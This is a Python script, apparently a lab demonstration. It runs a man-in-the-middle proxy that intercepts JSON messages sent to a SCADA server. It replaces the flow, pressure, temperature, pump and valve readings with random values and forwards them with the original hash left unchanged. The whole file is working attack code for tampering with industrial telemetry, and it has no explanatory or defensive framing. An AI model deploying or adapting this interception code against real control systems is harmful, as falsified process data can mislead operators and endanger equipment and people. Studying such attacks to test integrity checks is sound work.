import socket
import threading
import json
import random

def modify_scada_data(original_data):
    """Modify intercepted SCADA data but keep the original hash."""
    original_data["FlowRate"] = f"{random.randint(1500, 4000)} psi"
    original_data["PressureValue"] = f"{random.randint(10, 150)} bar"
    original_data["Temperature"] = f"{random.randint(50, 200)}°C"
    original_data["SwitchRate"] = random.choice(["ON", "OFF"])
    original_data["PumpStatus"] = random.choice(["active", "inactive"])
    original_data["ValveStatus"] = random.choice(["open", "close", "high"])
    original_data["FlowIndicator"] = random.choice(["low", "medium", "high"])

    # Attacker does NOT change the hash or status
    return original_data

def handle_client(client_socket, server_socket):
    """Intercept client messages, modify data, and forward them without changing hash."""
    try:
        while True:
            data = client_socket.recv(4096)
            if not data:
                break

            try:
                received_data = json.loads(data.decode())

                print(f"📩 Attacker intercepted: {json.dumps(received_data, indent=2)}")

                modified_data = modify_scada_data(received_data)
                print(f"🚨 Attacker forwarding modified data: {json.dumps(modified_data, indent=2)}")

                server_socket.sendall(json.dumps(modified_data).encode())  # Forward modified data

            except json.JSONDecodeError:
                print("❌ Invalid JSON received!")

    except Exception as e:
        print(f"❌ Error in handle_client: {e}")

    finally:
        client_socket.close()
        server_socket.close()

def attacker():
    """Creates a proxy server to intercept and modify SCADA messages"""
    while True:
        attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        attacker_socket.bind(('0.0.0.0', 54321))
        attacker_socket.listen(1)
        print("🚨 Attacker is intercepting client connections...")

        client_socket, client_addr = attacker_socket.accept()
        print(f"🔗 Attacker connected to client: {client_addr}")

        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect(('localhost', 12345))  # Connect to actual SCADA server

            client_handler = threading.Thread(target=handle_client, args=(client_socket, server_socket))
            client_handler.start()

        except Exception as e:
            print(f"❌ Error establishing connection to SCADA server: {e}")
            client_socket.close()

if __name__ == "__main__":
    attacker()
